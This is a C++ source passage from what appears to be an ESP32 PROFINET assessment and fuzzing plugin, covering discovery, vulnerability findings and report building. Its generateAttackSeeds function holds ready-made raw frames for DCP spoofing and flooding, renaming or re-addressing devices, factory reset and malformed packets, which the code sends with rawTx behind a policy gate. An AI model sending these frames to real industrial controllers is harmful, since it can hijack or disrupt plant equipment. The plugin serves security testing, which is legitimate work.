                if (finding.find("signature_invalid") != psram_string::npos) bump("HIGH");
                else bump("MEDIUM");
            }

            if (wants("default_name") && checkDefaultDeviceName(dev, finding)) {
                findings.push_back(finding);
                bump("MEDIUM");
            }

            if (wants("security_class") && checkSecurityClass(dev, finding)) {
                findings.push_back(finding);
                if (dev.security_class == PROFINET::SECURITY_CLASS_NONE) bump("CRITICAL");
                else bump("MEDIUM");
            }

            if (wants("unencrypted_comm_note") && checkUnencryptedComm(dev, finding)) {
                findings.push_back(finding);
                bump("LOW");
            }

            // PROFINET DCP "Set" operations (e.g., station name/IP assignment) are typically unauthenticated at Layer 2.
            // We do NOT execute any Set requests here. We report risk based on observed security class posture.
            if (wants("dcp_set_risk")) {
                finding.clear();
                if (dev.security_class == PROFINET::SECURITY_CLASS_NONE) {
                    finding = PSRAMUtils::createPSRAMString(
                        "{\"id\":\"profinet_dcp_unauth_set_risk\","
                        "\"severity\":\"HIGH\","
                        "\"detail\":\"Device is Security Class 0; PROFINET DCP Set operations (name/IP assignment) are typically unauthenticated at L2 and may be abused for reconfiguration/DoS\"}"
                    );
                    findings.push_back(finding);
                    bump("HIGH");
                } else {
                    finding = PSRAMUtils::createPSRAMString(
                        "{\"id\":\"profinet_dcp_set_risk_note\","
                        "\"severity\":\"INFO\","
                        "\"detail\":\"PROFINET DCP Set operations are a known L2 risk; higher Security Class reduces exposure but does not change the fact that DCP is L2 and must be protected by network controls\"}"
                    );
                    findings.push_back(finding);
                    bump("INFO");
                }
            }
        }
    }

    // Emit findings as events (keep existing behavior but only for this scan run).
    for (auto const& f : findings) {
        // Best-effort severity mapping for log channel
        LogLevel lvl = LogLevel::INFO;
        if (f.find("\"severity\":\"CRITICAL\"") != psram_string::npos) lvl = LogLevel::ERROR;
        else if (f.find("\"severity\":\"HIGH\"") != psram_string::npos) lvl = LogLevel::ERROR;
        else if (f.find("\"severity\":\"MEDIUM\"") != psram_string::npos) lvl = LogLevel::WARNING;
        else if (f.find("\"severity\":\"WARNING\"") != psram_string::npos) lvl = LogLevel::WARNING;
        reportVulnerabilityPSRAM(target_ps, f, lvl);
    }

    const uint64_t t1_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);

    // Build JSON report in PSRAM (returned to VulnerabilityScanner/UI).
    psram_string rep;
    rep.reserve(2048 + findings.size() * 256);
    rep += PSRAMUtils::createPSRAMString("{\"scan\":{");
    rep += PSRAMUtils::createPSRAMString("\"protocol\":\"profinet\",");
    rep += PSRAMUtils::createPSRAMString("\"target\":\"");
    rep += PSRAMUtils::createPSRAMString(target_label.c_str());
    rep += PSRAMUtils::createPSRAMString("\",");
    char nb[128];
    snprintf(nb, sizeof(nb), "\"timestamp_ms\":%llu,\"duration_ms\":%llu,",
             (unsigned long long)t0_ms, (unsigned long long)(t1_ms - t0_ms));
    rep += PSRAMUtils::createPSRAMString(nb);
    rep += PSRAMUtils::createPSRAMString("\"identify_ok\":");
    rep += PSRAMUtils::createPSRAMString(identify_ok ? "true" : "false");
    snprintf(nb, sizeof(nb), ",\"devices_found\":%u", (unsigned)devices.size());
    rep += PSRAMUtils::createPSRAMString(nb);
    rep += PSRAMUtils::createPSRAMString("},");

    rep += PSRAMUtils::createPSRAMString("\"scan_types_requested\":[");
    if (scan_types.empty()) {
        rep += PSRAMUtils::createPSRAMString("\"default\"");
    } else {
        for (size_t i = 0; i < scan_types.size(); ++i) {
            if (i) rep += PSRAMUtils::createPSRAMString(",");
            rep += PSRAMUtils::createPSRAMString("\"");
            rep += PSRAMUtils::createPSRAMString(scan_types[i].c_str());
            rep += PSRAMUtils::createPSRAMString("\"");
        }
    }
    rep += PSRAMUtils::createPSRAMString("],");

    rep += PSRAMUtils::createPSRAMString("\"devices\":");
    rep += PSRAMUtils::createPSRAMString(devices_json.c_str());
    rep += PSRAMUtils::createPSRAMString(",");

    rep += PSRAMUtils::createPSRAMString("\"findings\":[");
    for (size_t i = 0; i < findings.size(); ++i) {
        if (i) rep += PSRAMUtils::createPSRAMString(",");
        rep += findings[i];
    }
    rep += PSRAMUtils::createPSRAMString("],");

    snprintf(nb, sizeof(nb),
             "\"summary\":{\"critical\":%u,\"high\":%u,\"medium\":%u,\"low\":%u,\"info\":%u}}",
             (unsigned)sev_critical, (unsigned)sev_high, (unsigned)sev_medium, (unsigned)sev_low, (unsigned)sev_info);
    rep += PSRAMUtils::createPSRAMString(nb);

    scans_++;
    return PSRAMUtils::fromPSRAMString(rep);
}

std::string PROFINETPlugin::doNetworkDiscovery(const std::string& target_network,
                                               uint32_t timeout_ms) {
    psram_string target_ps = PSRAMUtils::createPSRAMString(target_network.c_str());
    psram_string report_ps;
    if (!doNetworkDiscoveryPSRAM(target_ps, timeout_ms, report_ps)) {
        return std::string{};
    }
    return PSRAMUtils::fromPSRAMString(report_ps);
}

bool PROFINETPlugin::doNetworkDiscoveryPSRAM(const psram_string& target_network,
                                             uint32_t timeout_ms,
                                             psram_string& out_report) {
    std::string legacy_target = PSRAMUtils::fromPSRAMString(target_network);
    std::string legacy_report = legacyDoNetworkDiscovery(legacy_target, timeout_ms);
    if (legacy_report.empty()) {
        out_report.clear();
        return false;
    }
    out_report = PSRAMUtils::createPSRAMString(legacy_report.c_str());
    return true;
}

std::string PROFINETPlugin::legacyDoNetworkDiscovery(const std::string& target_network, uint32_t timeout_ms) {
    if (!config_.enabled) {
        return "{\"protocol\":\"profinet\",\"error\":\"plugin_disabled\",\"devices\":[]}";
    }

    // Use the existing identifyAll method for PROFINET discovery
    std::string discovery_result;
    bool discovery_ok = identifyAll(discovery_result, timeout_ms);

    if (discovery_ok) {
        // The identifyAll method already returns JSON, so we can reformat it slightly
    psram_string result;
    result += PSRAMUtils::createPSRAMString("{\"protocol\":\"profinet\",\"target_network\":\"");
    result += PSRAMUtils::createPSRAMString(target_network.c_str());
    result += PSRAMUtils::createPSRAMString("\",\"devices\":");
    result += PSRAMUtils::createPSRAMString(discovery_result.c_str());
    char tbuf[48]; snprintf(tbuf, sizeof(tbuf), ",\"scan_time_ms\":%u}", (unsigned)timeout_ms);
    result += PSRAMUtils::createPSRAMString(tbuf);
    return PSRAMUtils::fromPSRAMString(result);
    } else {
        // Discovery failed - include the underlying reason from identifyAll() (JSON fragment).
        // Keep "error":"discovery_failed" for backward compatibility, but expose detail for debugging/UI.
        if (discovery_result.empty()) {
            discovery_result = "{\"error\":\"unknown\"}";
        }
        psram_string out;
        out += PSRAMUtils::createPSRAMString("{\"protocol\":\"profinet\",\"target_network\":\"");
        out += PSRAMUtils::createPSRAMString(target_network.c_str());
        out += PSRAMUtils::createPSRAMString("\",\"devices\":[],\"error\":\"discovery_failed\",\"detail\":");
        out += PSRAMUtils::createPSRAMString(discovery_result.c_str());
        char tbuf[48]; snprintf(tbuf, sizeof(tbuf), ",\"scan_time_ms\":%u}", (unsigned)timeout_ms);
        out += PSRAMUtils::createPSRAMString(tbuf);
        return PSRAMUtils::fromPSRAMString(out);
    }
}

bool PROFINETPlugin::identifyAll(std::string& out_json, uint32_t timeout_ms) {
    if (!eth_) {
        out_json = "{\"error\":\"raw_tx_unavailable\"}";
        return false;
    }

    // Reset discovery diagnostics counters (for this discovery window).
    discovery_rx_frames_.store(0, std::memory_order_relaxed);
    discovery_rx_identify_.store(0, std::memory_order_relaxed);
    discovery_parse_ok_.store(0, std::memory_order_relaxed);
    discovery_parse_fail_.store(0, std::memory_order_relaxed);
    discovery_last_frame_id_.store(0, std::memory_order_relaxed);

    // Arm discovery window: doPacketAnalysis() will populate discovery_devices_.
    {
        std::lock_guard<std::mutex> lk(discovery_mutex_);
        discovery_active_.store(true, std::memory_order_relaxed);
        discovery_keys_.clear();
        discovery_devices_.clear();
        discovery_last_detail_json_.clear();
    }

    std::vector<PROFINETDeviceInfo> unused;
    const bool tx_ok = sendDcpIdentifyAll(timeout_ms, unused);
    if (!tx_ok) {
        psram_string detail;
        {
            std::lock_guard<std::mutex> lk(discovery_mutex_);
            discovery_active_.store(false, std::memory_order_relaxed);
            detail = PSRAMUtils::createPSRAMString(
                "{\"error\":\"tx_fail\",\"rx_frames\":0,\"rx_identify\":0,\"parse_ok\":0,\"parse_fail\":0,\"devices\":0}"
            );
            discovery_last_detail_json_ = detail;
        }
        out_json = PSRAMUtils::fromPSRAMString(detail);
        return false;
    }

    // Wait for responses to be observed via the L2 capture pipeline.
    const uint64_t start_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    while (((uint64_t)(esp_timer_get_time() / 1000ULL) - start_ms) < (uint64_t)timeout_ms) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    psram_string arr;
    arr += PSRAMUtils::createPSRAMString("[");
    size_t devices_found = 0;
    {
        std::lock_guard<std::mutex> lk(discovery_mutex_);
        bool first = true;
        for (size_t i = 0; i < discovery_devices_.size(); ++i) {
            psram_string one;
            if (!buildDeviceInfoJSON(discovery_devices_[i], one)) {
                continue;
            }
            if (!first) {
                arr += PSRAMUtils::createPSRAMString(",");
            }
            first = false;
            arr += one;
        }
        devices_found = discovery_devices_.size();
        discovery_active_.store(false, std::memory_order_relaxed);
    }
    arr += PSRAMUtils::createPSRAMString("]");

    // Snapshot discovery diagnostics and store them for UI/debugging.
    const uint32_t rx_frames = discovery_rx_frames_.load(std::memory_order_relaxed);
    const uint32_t rx_identify = discovery_rx_identify_.load(std::memory_order_relaxed);
    const uint32_t parse_ok = discovery_parse_ok_.load(std::memory_order_relaxed);
    const uint32_t parse_fail = discovery_parse_fail_.load(std::memory_order_relaxed);
    const uint16_t last_fid = discovery_last_frame_id_.load(std::memory_order_relaxed);

    char dbuf[256];
    snprintf(dbuf, sizeof(dbuf),
             "{\"timeout_ms\":%u,\"rx_frames\":%u,\"rx_identify\":%u,"
             "\"parse_ok\":%u,\"parse_fail\":%u,\"last_frame_id\":%u,\"devices\":%u}",
             (unsigned)timeout_ms, (unsigned)rx_frames, (unsigned)rx_identify,
             (unsigned)parse_ok, (unsigned)parse_fail, (unsigned)last_fid, (unsigned)devices_found);
    {
        std::lock_guard<std::mutex> lk(discovery_mutex_);
        discovery_last_detail_json_ = PSRAMUtils::createPSRAMString(dbuf);
    }

    // Treat an empty Identify-All as a failed discovery, so the outer JSON includes "error" + "detail".
    if (devices_found == 0) {
        out_json = dbuf; // detail JSON fragment (not array)
        return false;
    }

    out_json = PSRAMUtils::fromPSRAMString(arr);
    return true;
}

bool PROFINETPlugin::isDefaultDeviceName(const std::string& name) const {
    if (!config_.check_default_names) return false;

    // Check against common default patterns
    for (const auto& pattern : config_.default_name_patterns) {
        if (name.find(pattern.c_str()) != std::string::npos) {
            return true;
        }
    }

    // Additional checks for common default names
    std::string lower_name = name;
    std::transform(lower_name.begin(), lower_name.end(), lower_name.begin(), ::tolower);

    return (lower_name == "station" || lower_name == "device" ||
            lower_name == "plc" || lower_name == "default" ||
            lower_name.find("unnamed") != std::string::npos ||
            lower_name.find("untitled") != std::string::npos);
}

bool PROFINETPlugin::hasSecurityClass(const std::string& device_info) const {
    if (!config_.check_security_class) return false;

    // Analyze device info for security indicators
    // This is a simplified check - in reality would parse device capabilities
    std::string lower_info = device_info;
    std::transform(lower_info.begin(), lower_info.end(), lower_info.begin(), ::tolower);

    // Check for security-related keywords in device information
    return (lower_info.find("security") != std::string::npos ||
            lower_info.find("encrypt") != std::string::npos ||
            lower_info.find("auth") != std::string::npos ||
            lower_info.find("secure") != std::string::npos);
}

void PROFINETPlugin::loadIDSRules(const std::string& rules_json) {
    (void)rules_json;
    LOG_INFO("PROFINET_PLUGIN", "PROFINET IDS rules loaded");
}

// Fuzzing API implementations (stubs)
bool PROFINETPlugin::generateSeedCorpus(const FuzzJob& job, std::vector<FuzzTestCase>& out) {
    out.clear();

    LOG_INFOF(TAG_PN, "Generating seed corpus for job %lu (profile=%s, safe_mode=%s)",
              (unsigned long)job.id,
              job.profile.empty() ? "default" : job.profile.c_str(),
              job.safe_mode ? "true" : "false");

    // If an advanced L2 profile was requested, prefer it over the basic Identify-All seed.
    if (!job.profile.empty() && job.profile != "default") {
        const bool unsafe_profile = (job.profile == "device_replacement");
        if (job.safe_mode && unsafe_profile) {
            LOG_WARNINGF(TAG_PN, "Refusing unsafe PROFINET profile '%s' in safe_mode=true", job.profile.c_str());
            return false;
        }

        if (generateAttackSeeds(job, job.profile, out) && !out.empty()) {
            for (auto& tc : out) {
                if (tc.attack_type.empty()) tc.attack_type = job.profile;
            }
            return true;
        }
    }

    // Default/basic seed: DCP Identify-All multicast.
    psram_vector<uint8_t> frame;
    if (buildDcpIdentifyAll(frame)) {
        FuzzTestCase tc;
        tc.payload.assign(frame.begin(), frame.end());
        tc.seed_id = 1;
        tc.attack_type = "default";
        out.push_back(tc);
    }
    return !out.empty();
}

bool PROFINETPlugin::fixup(const FuzzJob& job, const FuzzTestCase& in, FuzzTestCase& out) {
    (void)job; out = in;
    if (out.payload.size() < 60) out.payload.resize(60, 0x00);
    return true;
}

FuzzResult PROFINETPlugin::execute(const FuzzJob& job, const FuzzTestCase& tc,
                                  std::string& sent_hex, std::string& received_hex,
                                  std::string& status_details) {
    if (!job.safe_mode && (!sec_ || !sec_->isFuzzingAllowed())) {
        status_details = "blocked_by_offensive_policy:" +
            std::string(sec_ ? sec_->getFuzzingBlockReason() : "security_manager_unavailable");
        sent_hex.clear();
        received_hex.clear();
        return FuzzResult::SEND_FAILED;
    }

    // Convert payload to hex for sent_hex
    psram_string ps_hex;
    if (!tc.payload.empty()) {
        // Reserve approx 3 chars per byte (2 hex + space)
        size_t need = tc.payload.size() * 3;
        ps_hex.reserve(need);
        char hb[4]; hb[3] = 0;
        for (size_t i = 0; i < tc.payload.size(); ++i) {
            if (i > 0) ps_hex.push_back(' ');
            unsigned v = (unsigned)tc.payload[i];
            static const char* hexd = "0123456789ABCDEF";
            hb[0] = hexd[(v>>4)&0xF];
            hb[1] = hexd[v & 0xF];
            hb[2] = 0;
            ps_hex += PSRAMUtils::createPSRAMString(hb);
        }
    }
    sent_hex = PSRAMUtils::fromPSRAMString(ps_hex);
    received_hex.clear();

    if (!eth_) {
        status_details = "no_raw_ethernet_interface";
        return FuzzResult::SOCKET_ERROR;
    }

    bool sent = eth_->rawTx(tc.payload.data(), tc.payload.size());
    if (sent) {
        status_details = "sent_bytes:" + std::to_string(tc.payload.size());
        return FuzzResult::SUCCESS;
    } else {
        status_details = "raw_tx_failed";
        return FuzzResult::SEND_FAILED;
    }
}

// ==================== PHASE 7: PROFINET Advanced Fuzzing Seeds ====================

bool PROFINETPlugin::generateAttackSeeds(const FuzzJob& job, const std::string& attack_type, std::vector<FuzzTestCase>& out) {
    (void)job; out.clear();
    LOG_INFOF(TAG_PN, "Generating %s attack seeds", attack_type.c_str());

    if (attack_type == "dcp_spoofing") {
        // Attack 1: Fake DCP Identify response with malicious name
        FuzzTestCase spoof;
        spoof.seed_id = 6001;
        spoof.payload = {
            0xff,0xff,0xff,0xff,0xff,0xff,  // Broadcast dst
            0xDE,0xAD,0xBE,0xEF,0x00,0x01,  // Evil src MAC
            0x88,0x92,                       // EtherType PROFINET
            0xFE,0xFD,                       // FrameID: Identify Response
            0x05,                            // ServiceID: Identify
            0x01,                            // ServiceType: Success response
            0x12,0x34,0x56,0x78,            // XID (transaction ID)
            0x00,0x00,                       // Response delay
            0x00,0x1E,                       // DCP data length = 30
            // Block: Device Name
            0x02,0x02,                       // Option=Device, Suboption=NameOfStation
            0x00,0x0C,                       // Block length=12
            'R','O','G','U','E','-','P','L','C','-','0','1',  // Evil device name
            // Block: Vendor/Device ID
            0x02,0x01,0x00,0x04,            // Option=Device, Suboption=DeviceID, len=4
            0x00,0x2A,                       // Vendor: Siemens (spoofed)
            0xDE,0xAD                        // Device ID (fake)
        };
        // Pad to 60 bytes minimum
        while (spoof.payload.size() < 60) spoof.payload.push_back(0x00);
        out.push_back(spoof);

        // Attack 2: Multiple fake responses (DCP flooding)
        for (int i = 0; i < 10; i++) {
            FuzzTestCase flood;
            flood.seed_id = 6002 + i;
            flood.payload = spoof.payload;
            flood.payload[18] = 0x11 + i;  // Vary XID
            flood.payload[19] = 0x22 + i;
            out.push_back(flood);
        }
    }

    else if (attack_type == "device_replacement") {
        // Attack 3: DCP Set NameOfStation (device hijacking)
        FuzzTestCase set_name;
        set_name.seed_id = 6101;
        set_name.payload = {
            0x01,0x0E,0xCF,0x00,0x00,0x00,  // DCP multicast dst
            0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,  // Attacker src MAC
            0x88,0x92,                       // EtherType
            0xFE,0xFE,                       // FrameID: DCP Request
            0x04,                            // ServiceID: Set
            0x00,                            // ServiceType: Request
            0xAB,0xCD,0xEF,0x12,            // XID
            0x00,0x00,                       // Response delay
            0x00,0x14,                       // DCP data length = 20
            // Block: Set NameOfStation
            0x02,0x02,                       // Option=Device, Suboption=NameOfStation
            0x00,0x0A,                       // Block length=10
            'N','E','W','-','N','A','M','E','-','X',  // New device name
            // Block qualifier
            0x00,0x00,0x00,0x00,0x00,0x00  // Padding
        };
        while (set_name.payload.size() < 60) set_name.payload.push_back(0x00);
        out.push_back(set_name);

        // Attack 4: Set IP parameters (network disruption)
        FuzzTestCase set_ip;
        set_ip.seed_id = 6102;
        set_ip.payload = {
            0x01,0x0E,0xCF,0x00,0x00,0x00,
            0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
            0x88,0x92,
            0xFE,0xFE,
            0x04,0x00,                       // Set Request
            0xDE,0xAD,0xBE,0xEF,            // XID
            0x00,0x00,
            0x00,0x14,                       // DCP data length
            // Block: IP Parameters
            0x01,0x02,                       // Option=IP, Suboption=IPParameter
            0x00,0x0C,                       // Block length=12
            192,168,1,100,                   // Evil IP: 192.168.1.100
            255,255,255,0,                   // Netmask
            192,168,1,1,                     // Gateway
            0x00,0x00,0x00,0x00             // Padding
        };
        while (set_ip.payload.size() < 60) set_ip.payload.push_back(0x00);
        out.push_back(set_ip);

        // Attack 5: Reset device to factory defaults
        FuzzTestCase factory_reset;
        factory_reset.seed_id = 6103;
        factory_reset.payload = {
            0x01,0x0E,0xCF,0x00,0x00,0x00,
            0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
            0x88,0x92,
            0xFE,0xFE,
            0x04,0x00,                       // Set Request
            0xFF,0xFF,0xFF,0xFF,            // XID
            0x00,0x00,
            0x00,0x0C,                       // DCP data length
            // Block: Control - Reset to Factory
            0x05,0x06,                       // Option=Control, Suboption=ResetToFactory
            0x00,0x04,                       // Block length=4
            0x00,0x01,                       // Reset qualifier
            0x00,0x00                        // Reserved
        };
        while (factory_reset.payload.size() < 60) factory_reset.payload.push_back(0x00);
        out.push_back(factory_reset);
    }

    else if (attack_type == "topology_manipulation") {
        // Attack 6: LLDP-like topology confusion
        for (int i = 0; i < 5; i++) {
            FuzzTestCase topo;
            topo.seed_id = 6201 + i;
            uint8_t mac_byte = static_cast<uint8_t>(0x10 + i);
            uint8_t xid_byte = static_cast<uint8_t>(i);
            uint8_t port_char = static_cast<uint8_t>('1' + i);
            topo.payload = {
                0x01,0x80,0xC2,0x00,0x00,0x0E,  // LLDP multicast
                0xDE,0xAD,0xBE,0xEF,mac_byte,0x00,
                0x88,0x92,
                0xFC,0x01,                       // FrameID: PTCP (sync)
                0x06,0x00,                       // Hello
                0x00,0x00,0x00,xid_byte,
                0x00,0x00,
                0x00,0x08,
                0x01,0x01,0x00,0x04,            // Topology block
                'P','O','R','T',port_char
            };
            while (topo.payload.size() < 60) topo.payload.push_back(0x00);
            out.push_back(topo);
        }

        // Attack 7: PN-DCP Hello flood
        FuzzTestCase hello_flood;
        hello_flood.seed_id = 6210;
        hello_flood.payload = {
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // Broadcast
            0xBA,0xAD,0xC0,0xFF,0xEE,0x00,
            0x88,0x92,
            0xFE,0xFC,                       // FrameID: Hello
            0x06,0x00,                       // ServiceID: Hello, Type: Request
            0xBA,0xAD,0xF0,0x0D,            // XID
            0x00,0x01,                       // Fast response
            0x00,0x10,                       // Data length
            0x02,0x02,0x00,0x08,            // Device Name block
            'R','O','G','U','E','-','I','O'
        };
        while (hello_flood.payload.size() < 60) hello_flood.payload.push_back(0x00);
        out.push_back(hello_flood);
    }

    else if (attack_type == "malformed_packets") {
        // Attack 8: DCP data length overflow
        FuzzTestCase overflow;
        overflow.seed_id = 6301;
        overflow.payload = {
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xDE,0xAD,0xBE,0xEF,0x00,0x01,
            0x88,0x92,
            0xFE,0xFD,
            0x05,0x01,
            0x12,0x34,0x56,0x78,
            0x00,0x00,
            0xFF,0xFF,                       // DCP data length = 65535 (overflow!)
            0x02,0x02,0x00,0x04,            // Block that claims huge size
            'X','X','X','X'
        };
        while (overflow.payload.size() < 60) overflow.payload.push_back(0x00);
        out.push_back(overflow);

        // Attack 9: Invalid block length
        FuzzTestCase bad_block;
        bad_block.seed_id = 6302;
        bad_block.payload = {
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xDE,0xAD,0xBE,0xEF,0x00,0x02,
            0x88,0x92,
            0xFE,0xFD,
            0x05,0x01,
            0xAB,0xCD,0xEF,0x12,
            0x00,0x00,
            0x00,0x10,                       // DCP data length = 16
            0x02,0x02,                       // Device Name block
            0xFF,0xFE,                       // Block length = 65534 (exceeds packet!)
            'A','A','A','A','A','A','A','A'
        };
        while (bad_block.payload.size() < 60) bad_block.payload.push_back(0x00);
        out.push_back(bad_block);

        // Attack 10: Invalid service ID
        FuzzTestCase bad_service;
        bad_service.seed_id = 6303;
        bad_service.payload = {
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xDE,0xAD,0xBE,0xEF,0x00,0x03,
            0x88,0x92,
            0xFE,0xFE,
            0xFF,                            // Invalid ServiceID = 0xFF
            0x00,
            0x00,0x00,0x00,0x00,
            0x00,0x00,
            0x00,0x04,
            0xFF,0xFF,0x00,0x00
        };
        while (bad_service.payload.size() < 60) bad_service.payload.push_back(0x00);
        out.push_back(bad_service);

        // Attack 11: Corrupted FrameID
        FuzzTestCase bad_frameid;
        bad_frameid.seed_id = 6304;
        bad_frameid.payload = {
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xDE,0xAD,0xBE,0xEF,0x00,0x04,
            0x88,0x92,
            0xDE,0xAD,                       // Invalid FrameID (not standard DCP)
            0x05,0x01,
            0x12,0x34,0x56,0x78,
            0x00,0x00,
            0x00,0x08,
            0x02,0x02,0x00,0x04,
            'T','E','S','T'
        };
        while (bad_frameid.payload.size() < 60) bad_frameid.payload.push_back(0x00);
        out.push_back(bad_frameid);
    }

    else if (attack_type == "arp_profinet_confusion") {
        // Attack 12: ARP-PROFINET protocol confusion
        FuzzTestCase arp_confusion;
        arp_confusion.seed_id = 6401;
        arp_confusion.payload = {
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // Broadcast
            0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
            0x08,0x06,                       // EtherType: ARP (but followed by DCP data!)
            0xFE,0xFE,                       // DCP FrameID (confusion)
            0x05,0x00,
            0x12,0x34,0x56,0x78,
            0x00,0x00,
            0x00,0x10,
            0x02,0x02,0x00,0x08,
            'C','O','N','F','U','S','E','D'
        };
        while (arp_confusion.payload.size() < 60) arp_confusion.payload.push_back(0x00);
        out.push_back(arp_confusion);

        // Attack 13: Mixed VLAN tag with PROFINET
        FuzzTestCase vlan_attack;
        vlan_attack.seed_id = 6402;
        vlan_attack.payload = {
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
            0x81,0x00,                       // VLAN tag
            0x00,0x64,                       // VLAN ID = 100
            0x88,0x92,                       // EtherType PROFINET
            0xFE,0xFE,
            0x04,0x00,                       // Set request with VLAN
            0xE0,0x11,0xE0,0x11,            // XID (fixed hex literals)
            0x00,0x00,
            0x00,0x08,
            0x02,0x02,0x00,0x04,
            'V','L','A','N'
        };
        while (vlan_attack.payload.size() < 60) vlan_attack.payload.push_back(0x00);
        out.push_back(vlan_attack);
    }

    LOG_INFOF(TAG_PN, "Generated %zu advanced PROFINET attack seeds for %s", out.size(), attack_type.c_str());
    return !out.empty();
}

// ==================== FASE 4: PROFINET DCP Discovery Implementation ====================

const char* PROFINETPlugin::vendorIdToName(uint16_t vendor_id) {
    switch (vendor_id) {
        case 0x002A: return "Siemens";
        case 0x0143: return "Phoenix Contact";
        case 0x0116: return "Beckhoff";
        case 0x0109: return "Rockwell Automation";
        case 0x01BC: return "WAGO";
        case 0x0001: return "PROFIBUS Nutzerorganisation";
        default: return "Unknown";
    }
}

const char* PROFINETPlugin::deviceRoleToString(uint8_t role) {
    // PROFINET DCP "DeviceRole" is typically a bitmask:
    // bit0=IO-Device, bit1=IO-Controller, bit2=IO-Supervisor.
    static thread_local char buf[64];
    buf[0] = '\0';

    auto append = [&](const char* s) {
        if (!s || !*s) return;
        if (buf[0] != '\0') strncat(buf, "|", sizeof(buf) - strlen(buf) - 1);
        strncat(buf, s, sizeof(buf) - strlen(buf) - 1);
    };

    if (role & 0x01) append("IO-Device");
    if (role & 0x02) append("IO-Controller");
    if (role & 0x04) append("IO-Supervisor");

    if (buf[0] == '\0') {
        snprintf(buf, sizeof(buf), "0x%02X", (unsigned)role);
    }
    return buf;
}

bool PROFINETPlugin::sendDcpIdentifyAll(uint32_t timeout_ms, std::vector<PROFINETDeviceInfo>& devices) {
    devices.clear();

    if (!eth_) {
        LOG_WARNING(TAG_PN, "No raw Ethernet interface available for DCP discovery");
        return false;
    }

    // Build DCP Identify-All request
    psram_vector<uint8_t> frame;
    if (!buildDcpIdentifyAll(frame)) {
        LOG_WARNING(TAG_PN, "Failed to build DCP Identify-All frame");
        return false;
    }

    // Send a small set of request variants to maximize compatibility across stacks/switches.
    // 1) Multicast, resp_delay=0x0005 (default seed)
    // 2) Multicast, resp_delay=0x0000 (some devices prefer immediate response)
    // 3) Broadcast, resp_delay=0x0000 (fallback for environments filtering PI multicast)
    // 4) Multicast with 2-byte block qualifier field (len=2) (some parsers expect this layout)
    auto tx = [&](const uint8_t* p, size_t n) -> bool {
        bool ok = eth_->rawTx(p, n);
        if (!ok) {
            LOG_WARNINGF(TAG_PN, "DCP Identify-All rawTx failed (len=%u)", (unsigned)n);
        }
        return ok;
    };

    bool any_tx_ok = false;
    any_tx_ok = tx(frame.data(), frame.size()) || any_tx_ok;

    psram_vector<uint8_t> frame2 = frame;
    if (frame2.size() >= 14 + 12) {
        // ResponseDelay offset: 14 + 2+1+1+4 = 22
        frame2[14 + 8] = 0x00;
        frame2[14 + 9] = 0x00;
    }
    any_tx_ok = tx(frame2.data(), frame2.size()) || any_tx_ok;

    psram_vector<uint8_t> frame3 = frame2;
    if (frame3.size() >= 6) {
        for (int i = 0; i < 6; ++i) frame3[i] = 0xFF;
    }
    any_tx_ok = tx(frame3.data(), frame3.size()) || any_tx_ok;

    psram_vector<uint8_t> frame4 = frame2;
    if (frame4.size() >= 14 + 16) {
        // DCPDataLen offset: 14 + 10 = 24
        frame4[14 + 10] = 0x00;
        frame4[14 + 11] = 0x06; // include 2-byte qualifier
        // BlockLen offset: 14 + 14 = 28
        frame4[14 + 14] = 0x00;
        frame4[14 + 15] = 0x02; // qualifier only
        // Qualifier bytes already zero due to padding.
    }
    any_tx_ok = tx(frame4.data(), frame4.size()) || any_tx_ok;

    if (!any_tx_ok) {
        LOG_WARNING(TAG_PN, "Failed to transmit DCP Identify-All request variants");
        return false;
    }

    LOG_INFO(TAG_PN, "DCP Identify-All request sent (variants), waiting for responses...");

    // NOTE: On ESP32, we rely on the packet capture engine to receive responses
    // The responses will be processed via doPacketAnalysis() callback
    // This is a limitation of the platform - we cannot directly receive raw packets here

    // In a real implementation with AF_PACKET or similar, we would:
    // 1. Open raw socket
    // 2. Wait for timeout_ms
    // 3. Parse all received DCP Identify responses
    // 4. Fill devices vector

    // For now, return success indicating the request was sent
    // The actual device discovery happens via passive monitoring in doPacketAnalysis()

    scans_++;
    return true;
}

bool PROFINETPlugin::parseDcpIdentifyResponse(const uint8_t* dcp_data, size_t len, PROFINETDeviceInfo& dev_info) {
    if (len < 12) return false; // Minimum DCP header size
    dev_info.dcp_blocks_count = 0;

    // Parse DCP header
    uint16_t frame_id = rd16be(dcp_data + 0);
    uint8_t service_id = dcp_data[2];
    uint8_t service_type = dcp_data[3];
    uint16_t dcp_data_len = rd16be(dcp_data + 10);

    // Validate DCP FrameID for Identify response variants.
    // In the field, stacks commonly use 0xFEFC..0xFEFF for DCP frames (Identify req/resp variants).
    // We further restrict to *responses* below via service_type.
    if (frame_id < 0xFEFC || frame_id > 0xFEFF) {
        return false; // Not a DCP Identify frame
    }

    // Only process Identify responses
    if (service_id != PROFINET::DCP_SERVICE_IDENTIFY || service_type < PROFINET::DCP_RESPONSE_SUCCESS) {
        return false;
    }

    if (len < 12 + dcp_data_len) return false;

    // Parse DCP data blocks
    size_t pos = 12;
    bool signature_invalid_flag = false;
    while (pos + 4 <= 12 + dcp_data_len) {
        uint8_t option = dcp_data[pos];
        uint8_t suboption = dcp_data[pos + 1];
        uint16_t block_len = PROFINETPlugin::rd16be(dcp_data + pos + 2);
        pos += 4;

        if (pos + block_len > 12 + dcp_data_len) break;
        if (block_len < 2) {
            pos += block_len;
            if (block_len % 2 != 0) pos++;
            continue;
        }

        const uint8_t* block_data = dcp_data + pos;
        uint16_t qualifier = PROFINETPlugin::rd16be(block_data);
        const uint8_t* payload = block_data + 2;
        uint16_t payload_len = (uint16_t)(block_len - 2);

        record_dcp_block(dev_info, option, suboption, qualifier, payload, payload_len);

        // Parse different options
        if (option == PROFINET::DCP_OPT_DEVICE) {
